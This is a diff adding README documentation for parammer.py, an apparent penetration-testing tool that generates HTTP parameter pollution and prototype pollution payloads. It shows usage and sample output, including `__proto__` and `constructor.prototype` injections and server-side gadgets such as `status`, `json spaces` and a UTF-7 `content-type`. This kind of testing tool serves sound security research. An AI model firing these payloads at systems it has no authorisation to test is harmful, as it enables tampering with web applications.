@@ -66,6 +66,52 @@ python3 ppsignature.py -ul /tmp/urls
 ```
 
 
+# Parameter Polluter
 
+**Help**
 
+```bash
+usage: Parameter Pollution Payload Generator [-h] [-p] [-j] [-pp]
+
+options:
+  -h, --help            show this help message and exit
+  -p , --parameters     Parameters for poisoning
+  -j , --json           Specify JSON dictionary to poison
+  -pp, --prototype-pollution
+                        Generate Prototype pollution payloads
+```
+
+Generate polluter parameters from `foo=bar&bar=baz` and append prototype pollution payloads too
+
+```bash
+python3 parammer.py -p 'foo=bar&bar=baz' -pp
+foo=bar&foo=IrZFbp3EhFwgVEJY&bar=baz
+foo=bar&bar=baz&bar=s5PFsDRw8DwUdAWd
+foo[]=bar&foo[]=8qbNQZXidrBJz0zR&bar=baz
+foo=bar&bar[]=baz&bar[]=GPiO0PuJ4ZDnyzCW
+foo=bar&%66oo=fO21ApidTDgNlAfz&bar=baz
+foo=bar&bar=baz&%62ar=sRoKlO5vfz94ijqP
+foo=bar,E8XKDQHua4BhFGp2&bar=baz
+foo=bar&bar=baz,STBhY6AgcxBYAFx4
+bar=baz&foo=bar&constructor[prototype][polluted]=Z74dgWmQeVeJJ4aK
+bar=baz&foo=bar&constructor.prototype.polluted=Z74dgWmQeVeJJ4aK
+bar=baz&foo=bar&__proto__[polluted]={"json":"Z74dgWmQeVeJJ4aK"}
+bar=baz&foo=bar&__proto__[polluted]=Z74dgWmQeVeJJ4aK
+bar=baz&foo=bar&__proto__.polluted=Z74dgWmQeVeJJ4aK
+```
+The same generation but in this case the input and the output structure is a JSON data structure
+
+```js
+python3 parammer.py -j '{"username":"patrick","role":"user"}' -pp
+{"username": ["patrick", "Of4PXVStDWmBjVwt"], "role": "user"}
+{"username": "patrick", "role": ["user", "aColnFU3lZaDiDyV"]}
+{"username": {"username": "patrick", "unecpected": "VAZyqFSRQxItUmSO"}, "role": "user"}
+{"username": "patrick", "role": {"role": "user", "unecpected": "3KqzUabD2a98zUEF"}}
+{"username": "patrick", "role": "user", "__proto__": {"polluted": "DIYJe7sJXo2QGJRG"}}
+{"username": "patrick", "role": "user", "__proto__": {"polluted": {"json": "DIYJe7sJXo2QGJRG"}}}
+{"username": "patrick", "role": "user", "__proto__": {"status": 555}}
+{"username": "patrick", "role": "user", "__proto__": {"json spaces": 500}}
+{"username": "patrick", "role": "user", "__proto__": {"content-type": "application/json; charset=utf-7", "+AGYAbwBv-": "foo"}}
+{"username": "patrick", "role": "user", "constructor": {"prototype": {"polluted": "DIYJe7sJXo2QGJRG"}}}
+```
 
